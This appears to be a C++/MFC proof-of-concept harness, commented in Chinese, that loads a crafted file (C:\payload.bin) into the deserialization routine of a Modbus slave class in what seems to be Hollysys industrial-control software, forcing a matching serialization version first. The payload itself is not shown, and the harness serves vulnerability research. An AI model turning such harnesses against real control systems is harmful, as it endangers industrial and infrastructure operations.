#include <afx.h>
#include <afxwin.h>

// 声明外部函数 (在 AppData.dll / EXE 中)
// 如果链接报错，可以先把 SetSerilizeVersion 注释掉，只看 Get
// 但通常 Hollysys 的导出库里有这个
extern "C" void __stdcall SetSerilizeVersion(unsigned long ver);
extern "C" unsigned long __stdcall GetSerilizeVersion();

class CModbusSlave : public CObject {
public:
    virtual void Serialize(CArchive& ar);
    static CRuntimeClass* PASCAL GetThisClass();
};

extern "C" __declspec(dllexport) void RunPoc() {
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    // 1. 强制版本对齐 (关键!)
    // 我们必须确保 Load 时的环境与 Dump 时的环境一致 (0x26)
    // 如果找不到符号，可用 GetProcAddress 动态获取，或者先忽略
    HMODULE hApp = GetModuleHandle(NULL); // 或者 AppData.dll
    typedef void (WINAPI *FnSetVer)(unsigned long);
    typedef unsigned long (WINAPI *FnGetVer)();
    
    // 尝试动态获取 (更稳健)
    FnSetVer pSetVer = (FnSetVer)GetProcAddress(hApp, "?SetSerilizeVersion@CAppGlobalFunc@@SGXK@Z");
    FnGetVer pGetVer = (FnGetVer)GetProcAddress(hApp, "?GetSerilizeVersion@CAppGlobalFunc@@SGKXZ");
    
    // 如果找不到导出名，尝试硬编码搜到的地址，或者跳过
    if (pSetVer && pGetVer) {
        unsigned long oldVer = pGetVer();
        if (oldVer != 0x26) {
            CString msg;
            msg.Format(_T("Current Version: 0x%X. Forcing to 0x26."), oldVer);
            ::MessageBox(NULL, msg, _T("Version Fix"), MB_OK);
            pSetVer(0x26);
        }
    }

    // 2. 读取 payload.bin
    CFile f;
    CFileException e;
    if (!f.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary, &e)) {
        ::MessageBox(NULL, _T("Payload not found"), _T("Error"), MB_OK);
        return;
    }
    
    ULONGLONG totalLen = f.GetLength();
    int len = (int)totalLen;
    char* buf = new char[len];
    f.Read(buf, len);
    f.Close();

    CMemFile memFile((BYTE*)buf, len);
    CArchive ar(&memFile, CArchive::load);

    // 3. 创建对象
    HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
    typedef CRuntimeClass* (*FnGetClass)();
    FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!pfnGetClass) { ::MessageBox(NULL, _T("No GetClass"), _T("Err"), MB_OK); return; }
    
    CObject* pObj = pfnGetClass()->CreateObject();

    // 4. 带诊断的 Load
    try {
        pObj->Serialize(ar);
        ::MessageBox(NULL, _T("✅ LOAD SUCCESS!"), _T("Victory"), MB_OK);
    }
    catch (CArchiveException* e) {
        ULONGLONG pos = memFile.GetPosition();
        
        CString err;
        err.Format(_T("LOAD FAILED (EOF)\n\nCause: %d\nRead Position: %llu / %llu\nMissing Bytes: %llu"), 
            e->m_cause, pos, totalLen, (pos > totalLen ? pos - totalLen : 0));
        
        ::MessageBox(NULL, err, _T("Debug Info"), MB_OK | MB_ICONERROR);
        e->Delete();
    }
    catch (...) {
        ::MessageBox(NULL, _T("Unknown Crash"), _T("Fatal"), MB_OK);
    }

    delete pObj;
    delete[] buf;
}